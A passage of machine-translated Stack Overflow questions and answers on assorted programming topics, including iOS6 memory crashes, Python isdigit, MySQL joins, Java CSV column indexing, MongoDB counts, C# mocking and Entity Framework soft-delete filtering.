我还用其他广告（例如 inmobi）替换了 admob，它会持续更长时间，但有时仍然会崩溃（启动后 10 分钟）

请问有人可以给我关于这个问题的任何想法吗？这个崩溃只发生在IOS6，在IOS5一切都很好。我再次使用 ARC。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-16T07:20:14.837

我使用 ARC 的应用程序在 iOS6 上开始严重泄漏内存，而在 iOS5 上完美运行。当我说“泄漏”时，我实际上是指分配内存，然后当我从可变数组中删除对象时没有正确释放内存，导致应用程序的内存使用量急剧增加。

在经历了很多挫折之后，我设法通过在有问题的部分周围设置一个 @autoreleasepool { ... } 来解决它。

我怀疑 iOS6 对我的应用程序的线程处理与 iOS5 不同，因为曾经有一个 @autorelease 池覆盖该进程。

我希望这对某人有所帮助。祝你好运解决你的问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-01T11:04:34.773

By monitoring the memory on my app, I saw that on iOS6 there is less free memory (RAM) available compared to iOS5\. I guess iOS6 needs more memory. So, less memory is available for apps and memory warning are more frequent.

# python - 如何将 isdigit() 命令设置为变量？

> ID：12760904
> 
> 赞同：1
> 
> 时间：2012-10-06T15:02:45.727
> 
> 标签：python, variables, types

我是 python 的新手，但我很快就掌握了基础知识，并决定在我还在学习的时候开始尝试制作一个程序，因为我通过实际做事来学得最好。

所以我正在用python制作一个程序，它将添加多项式，我需要使用`isdigit()`命令查看解析器中的字符是否是数字im。

我不想一直在我的代码中键入`isdigit()`，例如`n.isdigit()`，我想将它分配给一个变量`t = 'isdigit()'`，然后键入`n.t`. 这不起作用，那么有没有不输入整个命令的替代方法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-06T15:05:09.700

给定一个实例，您必须创建一个自定义函数或 lambda 来`isdigit()`为您调用该方法：

```
t = lambda n: n.isdigit()

# ...

t(n)  # returns the result of `n.isdigit()` 
```

或者您可以存储对类方法的引用：

```
t = str.isdigit

# ...

t(n)  # returns the result of `str.isdigit(n)` 
```

和`n`类型一样`str`。

语法`n.t` *总是*会查找`t`为 上的属性，并且永远不会为此`n`查询局部变量。`t`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-06T15:06:41.603

虽然你可以用类似的东西开始你的代码`t = str.isdigit`然后检查`t(n)`（你不能让它成为字符串的属性，因为你不能从外部拦截属性查找），但这实际上是一个非常糟糕的主意。虽然打字速度更快，但阅读起来要困难得多。这会让你（或其他任何人）在几周后处理代码。这并不是因为对不必要的细节进行抽象是不好的（事实并非如此），这个片段根本不够复杂，无法从抽象中受益。任何可读的名称至少与 一样长`isidigt`，因此您实际上无法赢得任何可读性。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-06T15:23:44.243

您可以创建一个函数：

```
def t(n):
    if n.isdigit():
        return True
    else:
        return False

a = "a5b"
print t(a[1]) 
```

我不知道这是否是你要找的。

# mysql - 设计一个sql查询

> ID：12760914
> 
> 赞同：0
> 
> 时间：2012-10-06T15:03:58.410
> 
> 标签：mysql, join

说，我有 3 张桌子 - `purchase`, `image`,`coupons`

表中的字段`purchase`是 - `purchase_id`, `image_id`, `user_id`, `purchase_time`。

表中的字段`image`是 - `image_id`、`image_name`和`image_caption`其他图像详细信息。

表中的字段`coupon`是 -`image_id`和。`user_id``coupon_id`

[注：单`purchase_id`有唯一的`image_id`和`user_id`（购买的人），但`coupon`单`image_id`可以有多个`user_id`（很多人可以从同一张图片生成优惠券）。]

首先，我正在选择图像列表 -

```
SELECT p.purchase_id, 
       p.purchase_time, 
       p.user_id, 
       i.image_name, 
       i.image_caption 
FROM purchase p 
LEFT JOIN image i ON p.image_id = i.image_id 
WHERE p.user_id IN ($friends_id_string) 
ORDER BY p.purchase_time DESC 
```

是一个用户的所有朋友的`friends_id_string`列表`user_id`

接下来，我需要`coupon_id`为每个图像（其值也可以`NULL`）

```
SELECT c.coupon_id 
FROM coupon c 
WHERE c.image_id = $image_id AND c.user_id = $user_id 
```

因此，此查询告诉我该用户和该图像是否有活动`coupon_id`。

上述查询涉及单独查询每个图像，这是对数据库的冲击。我可以加入他们吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-06T15:11:18.127

这未经测试，因为您尚未提供架构、示例记录和所需结果，但请尝试一下，

```
SELECT  p.purchase_id,
        p.purchase_time,
        p.user_id,
        i.image_name,
        i.image_caption,
        c.coupon_id
FROM    purchase p
        LEFT JOIN IMAGE i
            ON p.image_id = i.image_id
        LEFT JOIN coupon c
            ON c.image_id = p.image_ID AND
                c.user_id = p.user_ID
WHERE p.user_id IN ($FRIENDS_ID_STRING)
ORDER BY p.purchase_time DESC 
```

# java - 在我的情况下避免幻数的最佳方法

> ID：12760917
> 
> 赞同：2
> 
> 时间：2012-10-06T15:04:14.573
> 
> 标签：java, architecture

我正在读取一个包含许多列 (22) 的文件，并且我正在使用 openCSV 来读取该文件。

每行都表示为一个字符串数组`nextLine[]`

我将不得不处理/验证列并且不想将它们称为数字（即`nextLine[0]`... `nextLine[22]`）

我更愿意将它们称为`nextLine[COLUMN_A] nextLine[COLUMN_B] ..etc.`

我最初的方法是使用枚举创建一个单例

```
public enum Columns {
    INSTANCE;
    public int COLUMN_A = 0;  
    ....
    public int COLUMN_X = 22; 
} 
```

然后我可以将数组称为：

```
nextLine[Columns.INSTANCE.COLUMN_A] 
```

**问题**

这会是最好的方法吗？我只是怀疑，因为我有另一个模型类，它只是为所有列提供了 getter/setter，现在创建另一个类（单例）来将列表示为索引似乎是一项额外的工作。

对于上面的示例，如果我有一个模型类

```
public class Columns {
  private String columnA;
  public Columns (String columnA) {
    this.columnA = columnA;
  } 
  public void setColumnA(String columnA) {
    this.columnA = columnA;
  }
  public String getColumnA() {
    return this.columnA;
  }
} 
```

我可以以某种方式使用`nextLine[columnA]`而不是创建一个单例枚举类吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-06T15:22:19.353

枚举不是单例。单例是一种特定的软件设计模式，传统上并不认为枚举是这样的。至少可以说，您对 Enum 的使用很奇怪。如果您想使用枚举来引用特定列，您可以简单地执行以下操作：

```
public enum Column {
    public int index;

    A(0), B(1), C(2), D(3);

    public Column( int index ) {
        this.index = index;
    }
} 
```

然后你就说：

```
String columnAValue = csv[row][Column.A.index] 
```

这样做还允许您像这样遍历所有列：

```
for( Column column : Column.values ) {
    String column = csv[row][column.index];
} 
```

您将无法使用您使用的模式来做到这一点，这使得使用 Enum 不值得。如果你要继续做你正在做的事情，只需在文件顶部将它们设为常规常量：

```
public class CsvParser {
    public static final int COLUMN_A = 0;
    public static final int COLUMN_B = 1;
    public static final int COLUMN_C = 2;

} 
```

这与您使用的枚举方法没有区别，只是它更直接并且不涉及定义另一个枚举。

现在回答你的问题。这是最好的模式吗？以及所有架构类型的问题，这取决于。您是否正在构建一个必须对 CSV 的每一列进行特定验证的程序？也许 A 列是一个整数，必须用作整数，B 列是一个字符串，C 列是一个枚举，等等。或者，你必须为每一列附加特定的逻辑，那么是的，如果格式是这种模式是有意义的您的数据始终是可预测的。如果您必须支持多种数据格式，但它们是固定的（即只有 format1、format2、format3），那么您可以继续遵循这种模式。

但是，如果您必须读取任何类型的 csv 格式，但附加一些固定数量的解析和/或逻辑，那么您必须读取有关 csv 的一些元数据，以了解哪些列是数字，哪些是字符串等. 你的逻辑可以通过查看元数据来附加。当然，这更灵活，但定义元数据、读取元数据并处理它并非易事。如果您不需要此模型，请不要这样做。另一种模型的工作量要少得多，而且同样健壮。

如果你从大局来看这个。在第一个架构中，我们有元数据。它是我们在程序中创建的 Enum 或常量。所以元数据被内置到程序中。在第二种风格中，我们将元数据从程序中移出到外部表示中，这样它就不会被烘焙到程序中。用户可以在运行时更改元数据，而在第一个版本中无法更改元数据。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-06T15:33:08.870

对于 22 列，我希望您不要单独处理列，而是以示意方式处理。因此，我会完全避免索引并做

```
for (String columnElement : nextLine) {
  // process columnElement
} 
```

如果每一列都有单独的特定含义，那么数组（或 List 或 Map）也不是最佳设计。然后我宁愿使用枚举或类对每一行进行建模（[或使用合适的框架而不是重新发明轮子](http://en.wikipedia.org/wiki/Not_invented_here)）。我不会为每一行编写 (g,s)setters，而是使用多态性，以便枚举/类知道如何处理每一列。甚至更好：有一个类用于将处理委托给 Column 类型的对象，例如

```
class Line {
  List<Column> columns;

  public void processLine() {
    for (Column c: columns) {
      c.processColumn();
  }

}

class Column {
  public void processColumn() {
    ...
  }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-06T15:18:50.903

我建议使用`HashMap`

在你的情况下可能是`HashMap<String, String[]> map;`

然后你可以得到你的价值观，比如：

```
String[] valuesIAmInterested =  map.get(columnA); 
```

更好的是，您可以真正使用您的对象`Column`作为地图的键。

```
HashMap<Column, String[]>   map; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-06T15:46:36.877

在考虑了更多之后，我认为这是你可以做的：

```
public class CsvParser {

    private File file;
    private boolean hasHeader = false;
    private Map<String,Integer> columnIndexes;
    private List<String[]> rows = new ArrayList<String[]>();

    public CsvParser( File file, boolean hasHeader ) throws IOException {
        this.file = file;
        this.hasHeader = hasHeader;
    }

    // use this to parse the header from the file
    private void parseColumns(LineNumberReader reader) {
        String line = reader.nextLine();
        if( line != null ) {
            String[] columns = line.split(",");
            setColumns( columns );
        }
    }

    // use this if there is no header in the data.
    public void setColumns( String[] columns ) {
        columnIndex = new HashMap<String,Integer>();
        for( int i = 0; i < columns.length; i++ ) columnIndexes.put( columns.trim(), i);
    }

    public void parse() throws IOException {
        LineNumberReader reader = new LineNumberReader( new FileReader( file ) );
        try {
           if( hasHeader ) parseColumns(reader);
           while( (line = reader.nextLine()) != null ) {
              rows.add( line.split(",") );
           }
        } finally {
           reader.close();
        }
    }

    public Collection<String> getColumns() {
       return columnIndexes.keys();
    }

    public int size() {
       return rows.size();
    }

    public int getInt( int row, String column ) {
       return Integer.parseInt(getString(row,column));
    }

    public String getString( int row, String column ) {
       return rows.get(row)[columnIndexes.get(column)];
    }

    public double getDouble( int row, String column ) {
       return Double.parseDouble(getString(row,column));
    }

    public float getFloat( int row, String column ) {
       return Float.parseFloat(getString(row,column));
    }
} 
```

# python - Gimp：将像素数据保存在 .xls 中？

> ID：12760922
> 
> 赞同：0
> 
> 时间：2012-10-06T15:04:32.723
> 
> 标签：python, pixel, xls, gimp

所以，我正在使用 Python，我需要将像素数据保存到 .xls 文件中，如下所示：第一列是行号，第二列是列号，第三列是颜色。我该怎么做这样的事情？我知道如何将 .xls 文件与 xlrd 和 xlwt 库一起使用，但是如何从 Gimp 图像中获取数据？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-19T12:26:10.383

关于如何从 gimp 内部进行操作的问题是什么？否则，使用 PIL 可能更容易。

无论如何，如果只是保存问题，并且如果您知道如何将数据保存为所需的格式，那么我会编写一个 gimp-python 插件。获取单个像素数据很简单，但是您需要查看 gimp 插件语法的一些细节。我建议查看示例，例如。[http://gimpbook.com/scripting/](http://gimpbook.com/scripting/)获取 Akkana Peck 的优秀教程和更多信息的链接。

# python - mongodb count() 和 python builtin len() 之间有区别吗

> ID：12760923
> 
> 赞同：0
> 
> 时间：2012-10-06T15:04:46.147
> 
> 标签：python, mongodb, pymongo

似乎我使用 mongodb和 python得到了**2 个不同的结果**`count()``len()`

```
db.users.find({"adresse.coord":{"$within":{"$center":[[4.365041,36.743954],100]}}}).distinct("produit_up") 
Out[17]: 
[{u'avatar': {u'avctype': u'image/jpeg', 
u'orientation': u'portrait', 
u'photo': ObjectId('506f2ee93a5f3a0528ab8621')}, 
u'spec': {u'abus': 0, 
u'date': u'2012-10-05', 
u'description': u'brrrrrrrrrrr', 
u'id': u'tofla134946378579', 
u'namep': u'nokia 6230', 
u'nombre': 2, 
u'prix': 1000, 
u'tags': [u'nokia', u'6230', u'photo'], 
u'vendu': False}}, 
{u'avatar': {u'avctype': u'image/jpeg', 
u'orientation': u'portrait', 
u'photo': ObjectId('506867863a5f3a0ea84dcd6c')}, 
u'spec': {u'abus': 0, 
u'date': u'2012-09-30', 
u'description': u"portable tr\xe8s solide, peu servi, avec batterie d'une autonomie de 3 heures.", 
u'id': u'alucaard134901952647', 
u'namep': u'nokia 3310', 
u'nombre': 1, 
u'prix': 1000, 
u'tags': [u'portable', u'nokia', u'3310'], 
u'vendu': False}}, 
{u'avatar': {u'avctype': u'image/jpeg', 
u'orientation': u'portrait', 
u'photo': ObjectId('506f2b3e3a5f3a0b3c4731a9')}, 
u'spec': {u'abus': 0, 
u'date': u'2012-10-05', 
u'description': u'bzzzzzzzzzz', 
u'id': u'alucaard134946284638', 
u'namep': u'nokia 6230', 
u'nombre': 1, 
u'prix': 2000, 
u'tags': [u'nokia', u'nok', u'noki'], 
u'vendu': False}}] 

db.users.find({"adresse.coord":{"$within":{"$center":[[4.365041,36.743954],100]}}}).count() 
Out[18]: 2 

len(db.users.find({"adresse.coord":{"$within":{"$center":[[4.365041,36.743954],100]}}}).distinct("produit_up")) 
Out[19]: 3 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-06T22:22:24.043

您的两个查询使用“distinct”，但第三个不使用 - 它只使用 count()。我不希望来自不同类型的查询的结果数量相同。

考虑这个学生的示例集合：

```
{name:"joe", class: ["biology","math"]}
{name:"jane", class: ["math", "english"]}

db.students.find().count()    
2
db.students.find().distinct("class")
["biology","math","english"]
len(db.students.find().distinct("class"))
3 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-06T22:30:48.313

mongodb[`.count()`](http://api.mongodb.org/python/current/api/pymongo/cursor.html#pymongo.cursor.Cursor.count)将执行服务器端查询，仅请求匹配的文档总数。它在查询中发送计数命令。MongoDB 只会向您的客户端驱动程序返回一个 int。

使用 python`len()`将对从 mongodb 查询返回的文档数进行客户端计数。这意味着您正在从数据库中接收完整的文档，并在本地对其进行操作。

如果只需要知道计数，那么第一个效率更高，因为结果更快更小。

如果您打算使用生成的文档并且还想知道计数，则将查询结果保存到变量中，并用于`len()`检查其大小。这样您就不必执行两个查询来获取计数 + 实际文档。

这是您关于它们用法之间差异的问题的主要答案。正如其他人所指出的，您正在比较的查询本身是不同的。

# android - 检测即将关闭的屏幕并在 Android 上拦截它

> ID：12760926
> 
> 赞同：0
> 
> 时间：2012-10-06T15:05:11.810
> 
> 标签：android, screen

我想创建一个程序，当屏幕即将关闭时跟踪用户的眼睛焦点，然后根据用户焦点的位置，屏幕将被允许关闭或保持打开。为此，我需要找到一种方法来拦截屏幕关闭命令。有谁知道这样做的适当的、肤浅的方法，所以我不需要深入研究生态系统？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T15:10:50.727

这可能有用：

[http://thinkandroid.wordpress.com/2010/01/24/handling-screen-off-and-screen-on-intents/](http://thinkandroid.wordpress.com/2010/01/24/handling-screen-off-and-screen-on-intents/)

请注意，这适用于活动生命周期，这意味着它仅对 1) 具有用户焦点的可见活动具有意义。听起来您正在尝试创建后台服务，这会*更加*棘手。这并不是真正设计用来挂钩的东西，尤其是对于不属于您自己的任意应用程序。

# c# - 模拟扩展方法作为接口

> ID：12760930
> 
> 赞同：-1
> 
> 时间：2012-10-06T15:05:18.640
> 
> 标签：c#, unit-testing, tdd, moq, mstest

它已经对其进行了研究，并发现了几个[像这样](https://stackoverflow.com/questions/2295960/mocking-extension-methods-with-moq)的有趣链接。 **但是对于我的问题，他们没有帮助我。**

# 代码

**我有以下界面**

```
public interface IViewFolderReference
{
    string FolderName { get; set; }
} 
```

**延期**

```
public static ICollection<TFile> GetFiles<TFile>(this IViewFolderReference view)
    where TFile: class, IFile
{
    var folder = view.GetFolder();
    return folder.Exists ? 
        Mapper.Map<ICollection<TFile>>(folder.GetFiles())
        : null;
} 
```

**混凝土类**

```
public class ProcessoViewModel : IViewFolderReference
{
    public string FolderName { get; set; }
    public ICollection<File> Arquivos { get; set; }    
    ...
} 
```

**测试方法**

```
[TestMethod]
public void Ao_salvar_processo_adicionar_dois_itens()
{
    // Arrange
    var vm = new Mock<ProcessoViewModel>();
    vm.Object.Arquivos = new List<File>() {
        new File { FileName = "Arquivo 1.jpg", DisplayName = "Arquivo 1" }
        ,new File { FileName = "Arquivo 2.doc", DisplayName = "Arquivo 2" }
    };

    //Act
    controller.salvar(vm.Object); // Problem here!! (GetFiles is called, How can mock the result??)

    //Assert
    var processoDb = repositorio.Query<Processo>().SingleOrDefault(p => p.Imovel == vm.Object.Imovel && vm.Object.DataEntrada == p.DataEntrada);
    Assert.IsNotNull(processoDb.Arquivos);
    Assert.AreEqual(processoDb.Arquivos.Count, 2);
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-06T16:45:04.377

如果您使用的是 VS 2010，则可以使用[Moles](http://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=2&ved=0CDEQFjAB&url=http://visualstudiogallery.msdn.microsoft.com/22c07bda-ffc9-479a-9766-bfd6ccacabd4&ei=jV9wUPu6H4mQ9QTW2IHABw&usg=AFQjCNE5vIkcyAjEkCYxdKI5vV7AM3WTVw&sig2=HbEFfKcSyBrndfoCFHWXkg&cad=rja)模拟扩展方法（因为它们只是使用 this 的第一个参数的静态方法）。[这里](http://social.msdn.microsoft.com/Forums/en-US/pex/thread/c56c3cc2-98d4-4e91-bd8b-e79b0813b07f)有一个例子。在 VS 2012 中，您可以使用[Microsoft Fakes](http://msdn.microsoft.com/en-us/library/hh549175.aspx)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-06T15:29:26.447

看起来你真正需要模拟的是`view.GetFolder()`一个合适的接口，可以让你模拟`folder.GetFiles()`。这样扩展方法 GetFiles 被执行，但最终被底层接口实现模拟。这与模拟应该如何工作是一致的。如果您已经对 GetFiles 扩展方法进行了测试，那么在测试其他内容时调用它并没有什么坏处。

# linq - ExpressionVisitor 软删除

> ID：12760933
> 
> 赞同：2
> 
> 时间：2012-10-06T15:05:32.697
> 
> 标签：linq, entity-framework, linq-expressions, soft-delete, expressionvisitor

我们在使用实体框架实现软删除功能时遇到了一些问题。这个想法是使用一个知道 EF 上下文的存储库。在存储库级别上，我们实现了一个插件系统，只要对存储库执行操作，就会执行这些插件。例如，当我们调用`Repository.GetQuery<Relation>()`插件时，就会执行。其中一个插件是 a `LogicalDeletePlugin`，这个插件应该`Where(x => x.IsDeleted)`向 select 中的每个表添加一个语句。`IsDeleted`想法是使用`ExpressionVisitor`访问 linq 表达式并找到所有“表”选择语句并添加`IsDeleted`条件来实现此插件。

为了澄清问题/问题，我将使用一些代码示例来解释这个问题。

```
void Main()
{
var options = new ReadonlyRepositoryOptions() { ConnectionStringDelegate = () => Connection.ConnectionString };
using (var context = new ReadonlyObjectContextRepository<PFishEntities>(options))
{
var query = context.GetQuery<Relation>()
.Select(x => new {
Test = x.Bonus,
TestWorks = x.Bonus.Where(y => y.bonID == 100)
});

query.InterceptWith(new TestVisitor()).ToList();
}
}

public class TestVisitor : ExpressionVisitor {
private ParameterExpression Parameter { get; set; }

protected override Expression VisitBinary(BinaryExpression node) {
"VisitBinary".Dump();
Expression left = this.Visit(node.Left);
Expression right = this.Visit(node.Right);

var newParams = new[] { Parameter };
var condition = (LambdaExpression)new LogicalDeletePlugin().QueryConditionals.First().Conditional;
var paramMap = condition.Parameters.Select((original, i) => new { original, replacement = newParams[i] }).ToDictionary(p => p.original, p => p.replacement);

var fixedBody = ParameterRebinder.ReplaceParameters(paramMap, condition.Body);
return Expression.MakeBinary(ExpressionType.AndAlso, node, fixedBody, node.IsLiftedToNull, node.Method);
    }

protected override Expression VisitParameter(ParameterExpression expr)
{
Parameter = expr;
return base.VisitParameter(expr);
}
}
void Main()
{
    var options = new ReadonlyRepositoryOptions() { ConnectionStringDelegate = () => Connection.ConnectionString };
    using (var context = new ReadonlyObjectContextRepository<PFishEntities>(options))
    {
        var query = context.GetQuery<Relation>()
        .Select(x => new {
            Test = x.Bonus,
            TestWorks = x.Bonus.Where(y => y.bonID == 100)
        });

        query.InterceptWith(new TestVisitor()).ToList();
    }
}

public class TestVisitor : ExpressionVisitor {
    private ParameterExpression Parameter { get; set; }

    protected override Expression VisitBinary(BinaryExpression node) {
        "VisitBinary".Dump();
        Expression left = this.Visit(node.Left);
        Expression right = this.Visit(node.Right);

        var newParams = new[] { Parameter };
        var condition = (LambdaExpression)new LogicalDeletePlugin().QueryConditionals.First().Conditional;
        var paramMap = condition.Parameters.Select((original, i) => new { original, replacement = newParams[i] }).ToDictionary(p => p.original, p => p.replacement);
        var fixedBody = ParameterRebinder.ReplaceParameters(paramMap, condition.Body);
        return Expression.MakeBinary(ExpressionType.AndAlso, node, fixedBody, node.IsLiftedToNull, node.Method);
    }

    protected override Expression VisitParameter(ParameterExpression expr)
    {
        Parameter = expr;
        return base.VisitParameter(expr);
    }
} 
```

上面的 c# 代码将产生以下 SQL 代码：

```
SELECT 
[UnionAll1].[relID] AS [C1], 
[UnionAll1].[C2] AS [C2], 
[UnionAll1].[C1] AS [C3], 
[UnionAll1].[bonID] AS [C4], 
[UnionAll1].[bonCUSTOMERID] AS [C5], 
[UnionAll1].[bonRELATIONARTICLEBONUSID] AS [C6], 
[UnionAll1].[bonINVOICEID] AS [C7], 
[UnionAll1].[bonSALEROWID] AS [C8], 
[UnionAll1].[bonVALUE] AS [C9], 
[UnionAll1].[bonPERCENTAGE] AS [C10], 
[UnionAll1].[bonMANUAL] AS [C11], 
[UnionAll1].[bonPAID] AS [C12], 
[UnionAll1].[IsDeleted] AS [C13], 
[UnionAll1].[InternalReference] AS [C14], 
[UnionAll1].[ConcurrencyToken] AS [C15], 
[UnionAll1].[Created] AS [C16], 
[UnionAll1].[CreatedBy] AS [C17], 
[UnionAll1].[Updated] AS [C18], 
[UnionAll1].[UpdatedBy] AS [C19], 
[UnionAll1].[DisplayMember] AS [C20], 
[UnionAll1].[ValueMember] AS [C21], 
[UnionAll1].[SearchField] AS [C22], 
[UnionAll1].[CreateDate] AS [C23], 
[UnionAll1].[C3] AS [C24], 
[UnionAll1].[C4] AS [C25], 
[UnionAll1].[C5] AS [C26], 
[UnionAll1].[C6] AS [C27], 
[UnionAll1].[C7] AS [C28], 
[UnionAll1].[C8] AS [C29], 
[UnionAll1].[C9] AS [C30], 
[UnionAll1].[C10] AS [C31], 
[UnionAll1].[C11] AS [C32], 
[UnionAll1].[C12] AS [C33], 
[UnionAll1].[C13] AS [C34], 
[UnionAll1].[C14] AS [C35], 
[UnionAll1].[C15] AS [C36], 
[UnionAll1].[C16] AS [C37], 
[UnionAll1].[C17] AS [C38], 
[UnionAll1].[C18] AS [C39], 
[UnionAll1].[C19] AS [C40], 
[UnionAll1].[C20] AS [C41], 
[UnionAll1].[C21] AS [C42], 
[UnionAll1].[C22] AS [C43]
FROM  (SELECT 
    CASE WHEN ([Extent2].[bonID] IS NULL) THEN CAST(NULL AS int) ELSE 1 END AS [C1], 
    [Extent1].[relID] AS [relID], 
    1 AS [C2], 
    [Extent2].[bonID] AS [bonID], 
    [Extent2].[bonCUSTOMERID] AS [bonCUSTOMERID], 
    [Extent2].[bonRELATIONARTICLEBONUSID] AS [bonRELATIONARTICLEBONUSID], 
    [Extent2].[bonINVOICEID] AS [bonINVOICEID], 
    [Extent2].[bonSALEROWID] AS [bonSALEROWID], 
    [Extent2].[bonVALUE] AS [bonVALUE], 
    [Extent2].[bonPERCENTAGE] AS [bonPERCENTAGE], 
    [Extent2].[bonMANUAL] AS [bonMANUAL], 
    [Extent2].[bonPAID] AS [bonPAID], 
    [Extent2].[IsDeleted] AS [IsDeleted], 
    [Extent2].[InternalReference] AS [InternalReference], 
    [Extent2].[ConcurrencyToken] AS [ConcurrencyToken], 
    [Extent2].[Created] AS [Created], 
    [Extent2].[CreatedBy] AS [CreatedBy], 
    [Extent2].[Updated] AS [Updated], 
    [Extent2].[UpdatedBy] AS [UpdatedBy], 
    [Extent2].[DisplayMember] AS [DisplayMember], 
    [Extent2].[ValueMember] AS [ValueMember], 
    [Extent2].[SearchField] AS [SearchField], 
    [Extent2].[CreateDate] AS [CreateDate], 
    CAST(NULL AS bigint) AS [C3], 
    CAST(NULL AS bigint) AS [C4], 
    CAST(NULL AS bigint) AS [C5], 
    CAST(NULL AS bigint) AS [C6], 
    CAST(NULL AS bigint) AS [C7], 
    CAST(NULL AS decimal(20,4)) AS [C8], 
    CAST(NULL AS decimal(20,4)) AS [C9], 
    CAST(NULL AS bit) AS [C10], 
    CAST(NULL AS decimal(20,4)) AS [C11], 
    CAST(NULL AS bit) AS [C12], 
    CAST(NULL AS varchar(1)) AS [C13], 
    CAST(NULL AS varbinary(1)) AS [C14], 
    CAST(NULL AS datetimeoffset) AS [C15], 
    CAST(NULL AS varchar(1)) AS [C16], 
    CAST(NULL AS datetimeoffset) AS [C17], 
    CAST(NULL AS varchar(1)) AS [C18], 
    CAST(NULL AS varchar(1)) AS [C19], 
    CAST(NULL AS varchar(1)) AS [C20], 
    CAST(NULL AS varchar(1)) AS [C21], 
    CAST(NULL AS datetime2) AS [C22]
    FROM  [dbo].[Relation] AS [Extent1]
    LEFT OUTER JOIN [dbo].[Bonus] AS [Extent2] ON [Extent1].[relID] = [Extent2].[bonCUSTOMERID]
UNION ALL
    SELECT 
    2 AS [C1], 
    [Extent3].[relID] AS [relID], 
    2 AS [C2], 
    CAST(NULL AS bigint) AS [C3], 
    CAST(NULL AS bigint) AS [C4], 
    CAST(NULL AS bigint) AS [C5], 
    CAST(NULL AS bigint) AS [C6], 
    CAST(NULL AS bigint) AS [C7], 
    CAST(NULL AS decimal(20,4)) AS [C8], 
    CAST(NULL AS decimal(20,4)) AS [C9], 
    CAST(NULL AS bit) AS [C10], 
    CAST(NULL AS decimal(20,4)) AS [C11], 
    CAST(NULL AS bit) AS [C12], 
    CAST(NULL AS varchar(1)) AS [C13], 
    CAST(NULL AS varbinary(1)) AS [C14], 
    CAST(NULL AS datetimeoffset) AS [C15], 
    CAST(NULL AS varchar(1)) AS [C16], 
    CAST(NULL AS datetimeoffset) AS [C17], 
    CAST(NULL AS varchar(1)) AS [C18], 
    CAST(NULL AS varchar(1)) AS [C19], 
    CAST(NULL AS varchar(1)) AS [C20], 
    CAST(NULL AS varchar(1)) AS [C21], 
    CAST(NULL AS datetime2) AS [C22], 
    [Extent4].[bonID] AS [bonID], 
    [Extent4].[bonCUSTOMERID] AS [bonCUSTOMERID], 
    [Extent4].[bonRELATIONARTICLEBONUSID] AS [bonRELATIONARTICLEBONUSID], 
    [Extent4].[bonINVOICEID] AS [bonINVOICEID], 
    [Extent4].[bonSALEROWID] AS [bonSALEROWID], 
    [Extent4].[bonVALUE] AS [bonVALUE], 
    [Extent4].[bonPERCENTAGE] AS [bonPERCENTAGE], 
    [Extent4].[bonMANUAL] AS [bonMANUAL], 
    [Extent4].[bonPAID] AS [bonPAID], 
    [Extent4].[IsDeleted] AS [IsDeleted], 
    [Extent4].[InternalReference] AS [InternalReference], 
    [Extent4].[ConcurrencyToken] AS [ConcurrencyToken], 
    [Extent4].[Created] AS [Created], 
    [Extent4].[CreatedBy] AS [CreatedBy], 
    [Extent4].[Updated] AS [Updated], 
    [Extent4].[UpdatedBy] AS [UpdatedBy], 
    [Extent4].[DisplayMember] AS [DisplayMember], 
    [Extent4].[ValueMember] AS [ValueMember], 
    [Extent4].[SearchField] AS [SearchField], 
    [Extent4].[CreateDate] AS [CreateDate]
    FROM  [dbo].[Relation] AS [Extent3]
    INNER JOIN [dbo].[Bonus] AS [Extent4] ON ([Extent3].[relID] = [Extent4].[bonCUSTOMERID]) AND (100 = [Extent4].[bonID]) AND ([Extent4].[IsDeleted] <> cast(1 as bit))) AS [UnionAll1]
ORDER BY [UnionAll1].[relID] ASC, [UnionAll1].[C1] ASC 
```

正如您在生成的 SQL 查询中看到的那样，`IsDeleted`语句被添加到`TestWorks = x.Bonus.Where(y => !y.IsDeleted)`“选择”代码中。这`TestVisitor`就是目前正在做的事情。但现在的问题是我们如何在其他选择上也实现这一点，而`x => !x.IsDeleted`不是在`Test = x.Bonus`部分上添加。

ExpressionVisitor 是完成此任务的正确方法还是我应该使用其他解决方案？感谢所有帮助！如果解释不够清楚，请告诉我，我会尝试提供一些额外的信息！

编辑：

```
protected override Expression VisitMember(MemberExpression node)
    {
        var test = typeof(bool);
        if (node.Type != test && node.Type != typeof(string))
        {
            var type = typeof(ArticleVat);
            var condition = (LambdaExpression)Condition;
            var newParams = new[] { Expression.Parameter(type, "x") };
            var paramMap = condition.Parameters.Select((original, i) => new { original, replacement = newParams[i] }).ToDictionary(p => p.original, p => p.replacement);
            var fixedBody = ParameterRebinder.ReplaceParameters(paramMap, condition.Body);
            condition = Expression.Lambda(fixedBody, newParams);
            var whereM = whereMethod.MakeGenericMethod(new [] { type });
            var expr = Expression.Property(node.Expression, "ArticleVat");
            var whereExpr = Expression.Call(whereM, expr, condition);
//          whereExpr.Dump();
node.Dump();
//          return Expression.MakeMemberAccess(whereExpr, node.Expression.Type.GetMember(node.Member.Name).Single());
//           return Expression.MakeMemberAccess(
//                whereExpr,
//                node.Expression.Type.GetMember(node.Member.Name).Single());
        }

        return base.VisitMember(node);
    } 
```

以上是我添加到 ExpressionVisitor 中的内容。现在，当我取消注释返回 Expression.MamkeMemberaccess 代码时，会引发异常，因为它不需要 MemberExpression 或其他东西。

以下是我想出的解决方案：

```
/// <summary>
/// This visitor will append a .Where(QueryCondition) clause for a given Condition to each Navigation property
/// </summary>
public class InjectConditionVisitor : ExpressionVisitor
{
    private QueryConditional QueryCondition { get; set; }

    public InjectConditionVisitor(QueryConditional condition)
    {
        QueryCondition = condition;
    }

    protected override Expression VisitMember(MemberExpression ex)
    {
